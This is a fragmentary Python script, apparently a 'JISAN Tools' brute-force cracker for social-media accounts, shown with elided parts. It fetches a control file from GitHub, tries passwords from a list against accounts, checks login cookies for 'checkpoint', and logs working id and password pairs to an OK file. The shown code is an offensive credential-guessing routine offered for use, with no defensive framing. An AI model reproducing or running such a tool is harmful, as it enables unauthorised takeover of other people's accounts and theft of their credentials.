...
princp=[]
try:
    prox= requests.get('https://github.com/X1X4D-2-0/CONTROL/blob/main/CONTROL.txt').text
...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/JISAN.King.Ok.Bro')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
os.system('espeak -a 300 " Welcome,   to,  JISAN,   Tools"')
pass
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                os.system('espeak -a 300 " Ok,  JISAN,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
